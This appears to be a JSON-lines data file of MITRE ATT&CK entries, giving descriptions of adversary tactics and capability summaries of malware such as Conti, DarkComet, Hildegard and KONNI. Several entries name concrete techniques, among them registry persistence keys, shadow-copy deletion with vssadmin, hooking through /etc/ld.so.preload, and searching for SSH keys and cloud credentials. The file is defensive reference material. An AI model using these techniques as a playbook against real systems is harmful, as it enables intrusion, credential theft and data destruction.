{"text": " The adversary is trying to move through your environment. Lateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier.", "idx": "https://attack.mitre.org/tactics/TA0008", "title": "Lateral Movement", "entity": "Lateral Movement", "entity_type": "tactics", "entity_context": [], "is_subtechnique": false}
{"text": " The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "idx": "https://attack.mitre.org/tactics/TA0011", "title": "Command and Control", "entity": "Command and Control", "entity_type": "tactics", "entity_context": [], "is_subtechnique": false}
{"text": " The adversary is trying to figure out your environment. Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective.", "idx": "https://attack.mitre.org/tactics/TA0007", "title": "Discovery", "entity": "Discovery", "entity_type": "tactics", "entity_context": [], "is_subtechnique": false}
{"text": " The adversary is trying to steal data. Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.", "idx": "https://attack.mitre.org/tactics/TA0010", "title": "Exfiltration", "entity": "Exfiltration", "entity_type": "tactics", "entity_context": [], "is_subtechnique": false}
{"text": " The adversary is trying to get into your network. Initial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spearphishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords.", "idx": "https://attack.mitre.org/tactics/TA0001", "title": "Initial Access", "entity": "Initial Access", "entity_type": "tactics", "entity_context": [], "is_subtechnique": false}
{"text": " The adversary is trying to steal account names and passwords. Credential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.", "idx": "https://attack.mitre.org/tactics/TA0006", "title": "Credential Access", "entity": "Credential Access", "entity_type": "tactics", "entity_context": [], "is_subtechnique": false}
{"text": " The adversary is trying to gain higher-level permissions. Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: * SYSTEM/root level * local administrator * user account with admin-like access * user accounts with access to specific system or perform specific function These techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.", "idx": "https://attack.mitre.org/tactics/TA0004", "title": "Privilege Escalation", "entity": "Privilege Escalation", "entity_type": "tactics", "entity_context": [], "is_subtechnique": false}
{"text": " The adversary is trying to manipulate, interrupt, or destroy your systems and data. Impact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.", "idx": "https://attack.mitre.org/tactics/TA0040", "title": "Impact", "entity": "Impact", "entity_type": "tactics", "entity_context": [], "is_subtechnique": false}
{"text": " The adversary is trying to run malicious code. Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "idx": "https://attack.mitre.org/tactics/TA0002", "title": "Execution", "entity": "Execution", "entity_type": "tactics", "entity_context": [], "is_subtechnique": false}
{"text": " The adversary is trying to gather data of interest to their goal. Collection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.", "idx": "https://attack.mitre.org/tactics/TA0009", "title": "Collection", "entity": "Collection", "entity_type": "tactics", "entity_context": [], "is_subtechnique": false}
{"text": " The adversary is trying to gather information they can use to plan future operations. Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Such information may include details of the victim organization, infrastructure, or staff/personnel. This information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute Initial Access, to scope and prioritize post-compromise objectives, or to drive and lead further Reconnaissance efforts.", "idx": "https://attack.mitre.org/tactics/TA0043", "title": "Reconnaissance", "entity": "Reconnaissance", "entity_type": "tactics", "entity_context": [], "is_subtechnique": false}
{"text": " The adversary is trying to establish resources they can use to support operations. Resource Development consists of techniques that involve adversaries creating, purchasing, or compromising/stealing resources that can be used to support targeting. Such resources include infrastructure, accounts, or capabilities. These resources can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using purchased domains to support Command and Control, email accounts for phishing as a part of Initial Access, or stealing code signing certificates to help with Defense Evasion.", "idx": "https://attack.mitre.org/tactics/TA0042", "title": "Resource Development", "entity": "Resource Development", "entity_type": "tactics", "entity_context": [], "is_subtechnique": false}
{"text": " [Hancitor](https://attack.mitre.org/software/S0499) is a downloader that has been used by [Pony](https://attack.mitre.org/software/S0453) and other information stealing malware.(Citation: Threatpost Hancitor)(Citation: FireEye Hancitor)", "idx": "https://attack.mitre.org/software/S0499", "title": "Hancitor", "entity": "Hancitor", "entity_type": "software", "entity_context": ["Hancitor has deleted files using the VBA <code>kill</code> function.", "Hancitor has used Base64 to encode malicious links. Hancitor has also delivered compressed payloads in ZIP files to victims.", "Hancitor has been delivered via phishing emails which contained malicious links.", "Hancitor has used malicious Microsoft Word documents, sent via email, which prompted the victim to enable macros.", "Hancitor has the ability to download additional files from C2.", "Hancitor has used verclsid.exe to download and execute a malicious script.", "Hancitor has been delivered via phishing emails with malicious attachments.", "Hancitor has relied upon users clicking on a malicious link delivered through phishing.", "Hancitor has decoded Base64 encoded URLs to insert a recipient’s name into the filename of the Word document. Hancitor has also extracted executables from ZIP files.", "Hancitor has used a macro to check that an ActiveDocument shape object in the lure message is present. If this object is not found, the macro will exit without downloading additional payloads.", "Hancitor has used PowerShell to execute commands.", "Hancitor has used <code>CallWindowProc</code> and <code>EnumResourceTypesA</code> to interpret and execute shellcode.", "Hancitor  has added Registry Run keys to establish persistence."], "is_subtechnique": false}
{"text": " [nbtstat](https://attack.mitre.org/software/S0102) is a utility used to troubleshoot NetBIOS name resolution. (Citation: TechNet Nbtstat)", "idx": "https://attack.mitre.org/software/S0102", "title": "nbtstat", "entity": "nbtstat", "entity_type": "software", "entity_context": ["nbtstat can be used to discover local NetBIOS domain names.", "nbtstat can be used to discover current NetBIOS sessions."], "is_subtechnique": false}
{"text": " [ABK](https://attack.mitre.org/software/S0469) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)", "idx": "https://attack.mitre.org/software/S0469", "title": "ABK", "entity": "ABK", "entity_type": "software", "entity_context": ["ABK has the ability to identify the installed anti-virus product on the compromised host.", "ABK has the ability to inject shellcode into svchost.exe.", "ABK has the ability to download files from C2.", "ABK has the ability to use cmd to run a Portable Executable (PE) on the compromised host.", "ABK has the ability to decrypt AES encrypted payloads.", "ABK can extract a malicious Portable Executable (PE) from a photo.", "ABK has the ability to use HTTP in communications with C2."], "is_subtechnique": false}
{"text": " [xCaon](https://attack.mitre.org/software/S0653) is an HTTP variant of the [BoxCaon](https://attack.mitre.org/software/S0651) malware family that has used by [IndigoZebra](https://attack.mitre.org/groups/G0136) since at least 2014. [xCaon](https://attack.mitre.org/software/S0653) has been used to target political entities in Central Asia, including Kyrgyzstan and Uzbekistan.(Citation: Checkpoint IndigoZebra July 2021)(Citation: Securelist APT Trends Q2 2017)", "idx": "https://attack.mitre.org/software/S0653", "title": "xCaon", "entity": "xCaon", "entity_type": "software", "entity_context": ["xCaon has checked for the existence of Kaspersky antivirus software on the system.", "xCaon has leveraged native OS function calls to retrieve  victim's network adapter's  information using GetAdapterInfo() API. ", "xCaon has communicated with the C2 server by sending POST requests over HTTP. ", "xCaon has encrypted data sent to the C2 server using a XOR key. ", "xCaon has used Base64 to encode its C2 traffic.", "xCaon has decoded strings from the C2 server before executing commands. ", "xCaon has a command to download files to the victim's machine.", "xCaon has added persistence via the Registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load</code> which causes the malware to run each time any user logs in.", "xCaon has used the GetAdaptersInfo() API call to get the victim's MAC address.", "xCaon has a command to start an interactive shell.", "xCaon has uploaded files from victims' machines."], "is_subtechnique": false}
{"text": " [Agent.btz](https://attack.mitre.org/software/S0092) is a worm that primarily spreads itself via removable devices such as USB drives. It reportedly infected U.S. military networks in 2008. (Citation: Securelist Agent.btz)", "idx": "https://attack.mitre.org/software/S0092", "title": "Agent.btz", "entity": "Agent.btz", "entity_type": "software", "entity_context": ["Agent.btz collects the network adapter’s IP and MAC address as well as IP addresses of the network adapter’s default gateway, primary/secondary WINS, DHCP, and DNS servers, and saves them into a log file.", "Agent.btz attempts to download an encrypted binary from a specified domain.", "Agent.btz drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.", "Agent.btz creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.", "Agent.btz saves system information into an XML file that is then XOR-encoded.", "Agent.btz obtains the victim username and saves it to a file."], "is_subtechnique": false}
{"text": " [BOOTRASH](https://attack.mitre.org/software/S0114) is a [Bootkit](https://attack.mitre.org/techniques/T1542/003) that targets Windows operating systems. It has been used by threat actors that target the financial sector.(Citation: Mandiant M Trends 2016)(Citation: FireEye Bootkits)(Citation: FireEye BOOTRASH SANS)", "idx": "https://attack.mitre.org/software/S0114", "title": "BOOTRASH", "entity": "BOOTRASH", "entity_type": "software", "entity_context": ["BOOTRASH is a Volume Boot Record (VBR) bootkit that uses the VBR to maintain persistence.", "BOOTRASH has used unallocated disk space between partitions for a hidden file system that stores components of the Nemesis bootkit."], "is_subtechnique": false}
{"text": " [BendyBear](https://attack.mitre.org/software/S0574) is an x64 shellcode for a stage-zero implant designed to download malware from a C2 server. First discovered in August 2020, [BendyBear](https://attack.mitre.org/software/S0574) shares a variety of features with [Waterbear](https://attack.mitre.org/software/S0579), malware previously attributed to the Chinese cyber espionage group [BlackTech](https://attack.mitre.org/groups/G0098).(Citation: Unit42 BendyBear Feb 2021)", "idx": "https://attack.mitre.org/software/S0574", "title": "BendyBear", "entity": "BendyBear", "entity_type": "software", "entity_context": ["BendyBear can load and execute modules and Windows Application Programming (API) calls using standard shellcode API hashing.", "BendyBear has used a custom RC4 and XOR encrypted protocol over port 443 for C2.", "BendyBear is designed to download an implant from a C2 server.", "BendyBear has decrypted function blocks using a XOR key during runtime to evade detection.", "BendyBear communicates to a C2 server over port 443 using modified RC4 and XOR-encrypted chunks. ", "BendyBear can check for analysis environments and signs of debugging using the Windows API <code>kernel32!GetTickCountKernel32</code> call. ", "BendyBear has used byte randomization to obscure its behavior.", "BendyBear can query the host's Registry key at <code>HKEY_CURRENT_USER\\Console\\QuickEdit</code> to retrieve data.", "BendyBear has the ability to determine local time on a compromised host. ", "BendyBear has encrypted payloads using RC4 and XOR."], "is_subtechnique": false}
{"text": " [DarkComet](https://attack.mitre.org/software/S0334) is a Windows remote administration tool and backdoor.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes DarkComet March 2018)", "idx": "https://attack.mitre.org/software/S0334", "title": "DarkComet", "entity": "DarkComet", "entity_type": "software", "entity_context": ["DarkComet can access the victim’s webcam to take pictures.", "DarkComet has a keylogging capability.", "DarkComet can load any files onto the infected machine to execute.", "DarkComet can open an active screen of the victim’s machine and take control of the mouse and keyboard.", "DarkComet adds several Registry entries to enable automatic execution at every system startup.", "DarkComet can execute various types of scripts on the victim’s machine.", "DarkComet can use HTTP for C2 communications.", "DarkComet has the option to compress its payload using UPX or MPRESS.", "DarkComet can steal data from the clipboard.", "DarkComet can collect the computer name, RAM used, and operating system version from the victim’s machine.", "DarkComet can disable Security Center functions like anti-virus.", "DarkComet can launch a remote shell to execute commands on the victim’s machine.", "DarkComet can listen in to victims' conversations through the system’s microphone.", "DarkComet can list active processes running on the victim’s machine.", "DarkComet has dropped itself onto victim machines with file names such as WinDefender.Exe and winupdate.exe in an apparent attempt to masquerade as a legitimate file.", "DarkComet gathers the username from the victim’s machine.", "DarkComet adds a Registry value for its installation routine to the Registry Key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Enable LUA=”0”</code> and <code>HKEY_CURRENT_USER\\Software\\DC3_FEXEC</code>.", "DarkComet can disable Security Center functions like the Windows Firewall."], "is_subtechnique": false}
{"text": " [FIVEHANDS](https://attack.mitre.org/software/S0618) is a customized version of [DEATHRANSOM](https://attack.mitre.org/software/S0616) ransomware written in C++. [FIVEHANDS](https://attack.mitre.org/software/S0618) has been used since at least 2021, including in Ransomware-as-a-Service (RaaS) campaigns, sometimes along with [SombRAT](https://attack.mitre.org/software/S0615).(Citation: FireEye FiveHands April 2021)(Citation: NCC Group Fivehands June 2021)", "idx": "https://attack.mitre.org/software/S0618", "title": "FIVEHANDS", "entity": "FIVEHANDS", "entity_type": "software", "entity_context": ["FIVEHANDS can use WMI to delete files on a  target machine.", "FIVEHANDS has the ability to delete volume shadow copies on compromised hosts.", "FIVEHANDS has the ability to decrypt its payload prior to execution.", "FIVEHANDS can enumerate network shares and mounted drives on a network.", "FIVEHANDS has the ability to enumerate files on a compromised host in order to encrypt files with specific extensions.", "FIVEHANDS can receive a command line argument to limit file encryption to specified directories.", "FIVEHANDS can use an embedded NTRU public key to encrypt data for ransom.", "The FIVEHANDS payload is encrypted with AES-128."], "is_subtechnique": false}
{"text": " [RIPTIDE](https://attack.mitre.org/software/S0003) is a proxy-aware backdoor used by [APT12](https://attack.mitre.org/groups/G0005). (Citation: Moran 2014)", "idx": "https://attack.mitre.org/software/S0003", "title": "RIPTIDE", "entity": "RIPTIDE", "entity_type": "software", "entity_context": ["APT12 has used the RIPTIDE RAT, which communicates over HTTP with a payload encrypted with RC4.", "APT12 has used RIPTIDE, a RAT that uses HTTP to communicate.", "RIPTIDE is a RAT that communicates with HTTP."], "is_subtechnique": false}
{"text": " The [Tasklist](https://attack.mitre.org/software/S0057) utility displays a list of applications and services with their Process IDs (PID) for all tasks running on either a local or a remote computer. It is packaged with Windows operating systems and can be executed from the command-line interface. (Citation: Microsoft Tasklist)", "idx": "https://attack.mitre.org/software/S0057", "title": "Tasklist", "entity": "Tasklist", "entity_type": "software", "entity_context": ["Tasklist can be used to discover services running on a system.", "Tasklist can be used to discover processes running on a system.", "Tasklist can be used to enumerate security software currently running on a system by process name of known products."], "is_subtechnique": false}
{"text": " [Conti](https://attack.mitre.org/software/S0575) is a Ransomware-as-a-Service that was first observed in December 2019, and has being distributed via [TrickBot](https://attack.mitre.org/software/S0266). It has been used against major corporations and government agencies, particularly those in North America. As with other ransomware families, actors using [Conti](https://attack.mitre.org/software/S0575) steal sensitive files and information from compromised networks, and threaten to publish this data unless the ransom is paid.(Citation: Cybereason Conti Jan 2021)(Citation: CarbonBlack Conti July 2020)(Citation: Cybleinc Conti January 2020)", "idx": "https://attack.mitre.org/software/S0575", "title": "Conti", "entity": "Conti", "entity_type": "software", "entity_context": ["\nConti has the ability to discover hosts on a target network.", "Conti can utilize command line options to allow an attacker control over how it scans and encrypts files.", "Conti can discover files on a local system.", "Conti can enumerate through all open processes to search for any that have the string “sql” in their process name.", "Conti can spread via SMB and encrypts files on different hosts, potentially compromising an entire network.", "Conti can retrieve the ARP cache from the local system by using the <code>GetIpNetTable()</code> API call and check to ensure IP addresses it connects to are for local, non-Internet, systems. ", "Conti has used API calls during execution. ", "Conti can spread itself by infecting other remote machines via network shared drives. ", "Conti can use compiler-based obfuscation for its code, encrypt DLLs, and hide Windows API calls.", "Conti can stop up to 146 Windows services related to security, backup, database, and email solutions through the use of <code>net stop</code>.", "Conti can enumerate routine network connections from a compromised host.", "Conti can use <code>CreateIoCompletionPort()</code>, <code>PostQueuedCompletionStatus()</code>, and <code>GetQueuedCompletionPort()</code> to rapidly encrypt files, excluding those with the extensions of .exe, .dll, and .lnk. It has used a different AES-256 encryption key per file with a bundled RAS-4096 public encryption key that is unique for each victim. Conti can use “Windows Restart Manager” to ensure files are unlocked and open for encryption.", "Conti has decrypted its payload using a hardcoded AES-256 key.", "Conti has loaded an encrypted DLL into memory and then executes it.", "Conti can delete Windows Volume Shadow Copies using <code>vssadmin</code>.", "Conti can enumerate remote open SMB network shares using <code>NetShareEnum()</code>."], "is_subtechnique": false}
{"text": " [Hildegard](https://attack.mitre.org/software/S0601) is malware that targets misconfigured kubelets for initial access and runs cryptocurrency miner operations. The malware was first observed in January 2021. The TeamTNT activity group is believed to be behind [Hildegard](https://attack.mitre.org/software/S0601). (Citation: Unit 42 Hildegard Malware)", "idx": "https://attack.mitre.org/software/S0601", "title": "Hildegard", "entity": "Hildegard", "entity_type": "software", "entity_context": ["Hildegard has used xmrig to mine cryptocurrency.", "Hildegard has downloaded additional scripts that build and run Monero cryptocurrency miners.", "Hildegard was executed through an unsecure kubelet that allowed anonymous access to the victim environment.", "Hildegard has used an IRC channel for C2 communications.", "Hildegard has encrypted an ELF file.", "Hildegard has used the BOtB tool which exploits CVE-2019-5736. ", "Hildegard has established tmate sessions for C2 communications.", "Hildegard has disguised itself as a known Linux process.", "Hildegard has used masscan to search for kubelets and the kubelet API for additional running containers. ", "Hildegard has decrypted ELF files with AES.", "Hildegard has created a user named “monerodaemon”.", "Hildegard has downloaded scripts from GitHub.", "Hildegard has started a monero service.", "Hildegard has collected the host's OS, CPU, and memory information.", "Hildegard has used masscan to look for kubelets in the internal Kubernetes network.", "Hildegard has modified /etc/ld.so.preload to intercept shared library import functions.", "Hildegard has used history -c to clear script shell logs.", "Hildegard was executed through the kubelet API run command and by executing commands on running containers.", "Hildegard has used the BOtB tool that can break out of containers.  ", "Hildegard has searched for private keys in .ssh.", "Hildegard has modified /etc/ld.so.preload to overwrite readdir() and readdir64().", "Hildegard has deleted scripts after execution. ", "Hildegard has modified DNS resolvers to evade DNS monitoring tools.", "Hildegard has queried the Cloud Instance Metadata API for cloud credentials.", "Hildegard has used shell scripts for execution.", "Hildegard has packed ELF files into other binaries.", "Hildegard has searched for SSH keys, Docker credentials, and Kubernetes service tokens."], "is_subtechnique": false}
{"text": " [Hydraq](https://attack.mitre.org/software/S0203) is a data-theft trojan first used by [Elderwood](https://attack.mitre.org/groups/G0066) in the 2009 Google intrusion known as Operation Aurora, though variations of this trojan have been used in more recent campaigns by other Chinese actors, possibly including [APT17](https://attack.mitre.org/groups/G0025). (Citation: MicroFocus 9002 Aug 2016) (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Trojan.Hydraq Jan 2010) (Citation: ASERT Seven Pointed Dagger Aug 2015) (Citation: FireEye DeputyDog 9002 November 2013) (Citation: ProofPoint GoT 9002 Aug 2017) (Citation: FireEye Sunshop Campaign May 2013) (Citation: PaloAlto 3102 Sept 2015)", "idx": "https://attack.mitre.org/software/S0203", "title": "Hydraq", "entity": "Hydraq", "entity_type": "software", "entity_context": ["Hydraq creates a backdoor through which remote attackers can adjust token privileges.", "Hydraq uses svchost.exe to execute a malicious DLL included in a new service group.", "Hydraq creates a backdoor through which remote attackers can load and call DLL functions.", "Hydraq creates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value. Hydraq's backdoor also enables remote attackers to modify and delete subkeys.", "Hydraq creates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives.", "Hydraq includes a component based on the code of VNC that can stream a live feed of the desktop of an infected host.", "Hydraq creates new services to establish persistence.", "Hydraq creates a backdoor through which remote attackers can download files and additional malware components.", "Hydraq creates a backdoor through which remote attackers can monitor processes.", "Hydraq connects to a predefined domain on port 443 to exfil gathered information.", "Hydraq uses basic obfuscation in the form of spaghetti code.", "Hydraq creates a backdoor through which remote attackers can delete files.", "Hydraq creates a backdoor through which remote attackers can retrieve system information, such as CPU speed, from Registry keys.", "Hydraq creates a backdoor through which remote attackers can clear all system event logs.", "Hydraq creates a backdoor through which remote attackers can monitor services.", "Hydraq creates a backdoor through which remote attackers can retrieve information such as computer name, OS version, processor speed, memory size, and CPU speed.", "Hydraq creates a backdoor through which remote attackers can retrieve IP addresses of compromised machines.", "Hydraq creates a backdoor through which remote attackers can read data from files.", "Hydraq C2 traffic is encrypted using bitwise NOT and XOR operations."], "is_subtechnique": false}
{"text": " [KONNI](https://attack.mitre.org/software/S0356) is a Windows remote administration too that has been seen in use since 2014 and evolved in its capabilities through at least 2017. [KONNI](https://attack.mitre.org/software/S0356) has been linked to several campaigns involving North Korean themes.(Citation: Talos Konni May 2017) [KONNI](https://attack.mitre.org/software/S0356) has significant code overlap with the [NOKKI](https://attack.mitre.org/software/S0353) malware family. There is some evidence potentially linking [KONNI](https://attack.mitre.org/software/S0356) to [APT37](https://attack.mitre.org/groups/G0067).(Citation: Unit 42 NOKKI Sept 2018)(Citation: Unit 42 Nokki Oct 2018)(Citation: Medium KONNI Jan 2020)", "idx": "https://attack.mitre.org/software/S0356", "title": "KONNI", "entity": "KONNI", "entity_type": "software", "entity_context": ["KONNI can collect the IP address from the victim’s machine.", "KONNI has the capability to perform keylogging.", "KONNI bypassed UAC with the “AlwaysNotify” settings.", "KONNI can gather the OS version, architecture information, connected drives, hostname, and computer name from the victim’s machine and has used systeminfo.exe to get a snapshot of the current system state of the target machine.", "A version of KONNI drops a Windows shortcut on the victim’s machine to establish persistence.", "KONNI has used tasklist.exe to get a snapshot of the current processes’ state of the target machine.", "A version of KONNI drops a Windows shortcut into the Startup folder to establish persistence.", "KONNI has used a custom base64 key to encode stolen data before exfiltration.", "KONNI has duplicated the token of a high integrity process to spawn an instance of cmd.exe under an impersonated user.", "KONNI creates a shortcut called \"Anti virus service.lnk\" in an apparent attempt to masquerade as a legitimate file.", "KONNI can delete files.", "KONNI has used certutil to download and decode base64 encoded strings. ", "KONNI has modified registry keys of ComSysApp service and Svchost on the machine to gain persistence.", "A version of KONNI searches for filenames created with a previous version of the malware, suggesting different versions targeted the same victims and the versions may work together.", "KONNI has modified ComSysApp service to load the malicious DLL payload.", "KONNI has used cmd.exe execute arbitrary commands on the infected host across different stages of the infection change.", "KONNI has used FTP to exfiltrate reconnaissance data out.", "KONNI can steal profiles (containing credential information) from Firefox, Chrome, and Opera.", "KONNI can download files and execute them on the victim’s machine.", "KONNI can take screenshots of the victim’s machine.", "KONNI used PowerShell to download and execute a specific 64-bit version of the malware.", "KONNI had a feature to steal data from the clipboard.", "KONNI can collect the username from the victim’s machine.", "KONNI has used Rundll32 to execute its loader for privilege escalation purposes.", "KONNI has used HTTP for C2."], "is_subtechnique": false}
{"text": " [HAMMERTOSS](https://attack.mitre.org/software/S0037) is a backdoor that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2015. (Citation: FireEye APT29) (Citation: F-Secure The Dukes)", "idx": "https://attack.mitre.org/software/S0037", "title": "HAMMERTOSS", "entity": "HAMMERTOSS", "entity_type": "software", "entity_context": ["Before being appended to image files, HAMMERTOSS commands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands, an investigator would need access to the intended malware sample, the day's tweet, and the image file containing the command.", "The \"Uploader\" variant of HAMMERTOSS visits a hard-coded server over HTTP/S to download the images HAMMERTOSS uses to receive commands.", "HAMMERTOSS is controlled via commands that are appended to image files.", "HAMMERTOSS is known to use PowerShell.", "HAMMERTOSS has used <code>-WindowStyle hidden</code> to conceal PowerShell windows.", "The \"tDiscoverer\" variant of HAMMERTOSS establishes a C2 channel by downloading resources from Web services like Twitter and GitHub. HAMMERTOSS binaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day.", "HAMMERTOSS exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later."], "is_subtechnique": false}
{"text": " [Zeus Panda](https://attack.mitre.org/software/S0330) is a Trojan designed to steal banking information and other sensitive credentials for exfiltration. [Zeus Panda](https://attack.mitre.org/software/S0330)’s original source code was leaked in 2011, allowing threat actors to use its source code as a basis for new malware variants. It is mainly used to target Windows operating systems ranging from Windows XP through Windows 10.(Citation: Talos Zeus Panda Nov 2017)(Citation: GDATA Zeus Panda June 2017)", "idx": "https://attack.mitre.org/software/S0330", "title": "Zeus Panda", "entity": "Zeus Panda", "entity_type": "software", "entity_context": ["Zeus Panda collects the current system time (UTC) and sends it back to the C2 server.", "Zeus Panda adds persistence by creating Registry Run keys.", "Zeus Panda modifies several Registry keys under <code>HKCU\\Software\\Microsoft\\Internet Explorer\\ PhishingFilter\\</code> to disable phishing filters.", "Zeus Panda can launch an interface where it can execute several commands on the victim’s PC.", "Zeus Panda uses PowerShell to download and execute the payload.", "Zeus Panda checks processes on the system and if they meet the necessary requirements, it injects into that process.", "Zeus Panda can launch remote scripts on the victim’s machine.\t", "Zeus Panda checks for running processes on the victim’s machine.", "Zeus Panda has a command to delete a file. It also can uninstall scripts and delete files to cover its track.", "Zeus Panda encrypts strings with XOR and obfuscates the macro code from the initial payload. Zeus Panda also encrypts all configuration and settings in AES and RC4.", "Zeus Panda can download additional malware plug-in modules and execute them on the victim’s machine.", "Zeus Panda checks for the existence of a Registry key and if it contains certain values.", "Zeus Panda can hook GetClipboardData function to watch for clipboard pastes to collect.", "Zeus Panda checks to see if anti-virus, anti-spyware, or firewall products are installed in the victim’s environment.", "Zeus Panda queries the system's keyboard mapping to determine the language used on the system. It will terminate execution if it detects LANG_RUSSIAN, LANG_BELARUSIAN, LANG_KAZAK, or LANG_UKRAINIAN.", "Zeus Panda hooks processes by leveraging its own IAT hooked functions.", "Zeus Panda can take screenshots of the victim’s machine.", "Zeus Panda searches for specific directories on the victim’s machine.", "Zeus Panda collects the OS version, system architecture, computer name, product ID, install date, and information on the keyboard mapping to determine the language used on the system.", "Zeus Panda uses HTTP for C2 communications.", "Zeus Panda can perform keylogging on the victim’s machine by hooking the functions TranslateMessage and WM_KEYDOWN.", "Zeus Panda decrypts strings in the code during the execution process."], "is_subtechnique": false}
{"text": " [BackConfig](https://attack.mitre.org/software/S0475) is a custom Trojan with a flexible plugin architecture that has been used by [Patchwork](https://attack.mitre.org/groups/G0040).(Citation: Unit 42 BackConfig May 2020)", "idx": "https://attack.mitre.org/software/S0475", "title": "BackConfig", "entity": "BackConfig", "entity_type": "software", "entity_context": ["BackConfig has been signed with self signed digital certificates mimicking a legitimate software company.", "BackConfig has used VBS to install its downloader component and malicious documents with VBA macro code.", "BackConfig has compromised victims via links to URLs hosting malicious content.", "BackConfig has the ability to use hidden columns in Excel spreadsheets to store executable files or commands for VBA macros.", "BackConfig has the ability to set folders or files to be hidden from the Windows Explorer default view.", "BackConfig has the ability to identify folders and files related to previous infections.\t", "BackConfig has the ability to use scheduled tasks to repeatedly execute malicious payloads on a compromised host.", "BackConfig can download and run batch files to execute commands on a compromised host.", "BackConfig can download and execute additional payloads on a compromised host.", "BackConfig has the ability to use HTTPS for C2 communiations.", "BackConfig has the ability to remove files and folders related to previous infections.", "BackConfig has used a custom routine to decrypt strings.", "BackConfig has hidden malicious payloads in <code>%USERPROFILE%\\Adobe\\Driver\\dwg\\</code> and mimicked the legitimate DHCP service binary.", "BackConfig has the ability to gather the victim's computer name.", "BackConfig has used compressed and decimal encoded VBS scripts.", "BackConfig can leverage API functions such as <code>ShellExecuteA</code> and <code>HttpOpenRequestA</code> in the process of downloading and executing files."], "is_subtechnique": false}
{"text": " [JSS Loader](https://attack.mitre.org/software/S0648) is Remote Access Trojan (RAT) with .NET and C++ variants that has been used by [FIN7](https://attack.mitre.org/groups/G0046) since at least 2020.(Citation: eSentire FIN7 July 2021)(Citation: CrowdStrike Carbon Spider August 2021)", "idx": "https://attack.mitre.org/software/S0648", "title": "JSS Loader", "entity": "JSS Loader", "entity_type": "software", "entity_context": ["JSS Loader has the ability to download and execute PowerShell scripts.", "JSS Loader has the ability to launch scheduled tasks to establish persistence.", "JSS Loader has been executed through malicious attachments contained in spearphishing emails.", "JSS Loader can download and execute VBScript files.", "JSS Loader has been delivered by phishing emails containing malicious Microsoft Excel attachments.", "JSS Loader can download and execute JavaScript files.", "JSS Loader has the ability to download malicious executables to a compromised host."], "is_subtechnique": false}
{"text": " [JCry](https://attack.mitre.org/software/S0389) is ransomware written in Go. It was identified as apart of the #OpJerusalem 2019 campaign.(Citation: Carbon Black JCry May 2019)", "idx": "https://attack.mitre.org/software/S0389", "title": "JCry", "entity": "JCry", "entity_type": "software", "entity_context": ["JCry has used PowerShell to execute payloads.", "JCry has achieved execution by luring users to click on a file that appeared to be an Adobe Flash Player update installer. ", "JCry has been observed deleting shadow copies to ensure that data cannot be restored easily.\t", "JCry has created payloads in the Startup directory to maintain persistence. ", "JCry has encrypted files and demanded Bitcoin to decrypt those files. ", "JCry has used <code>cmd.exe</code> to launch PowerShell.\t", "JCry has used VBS scripts. "], "is_subtechnique": false}
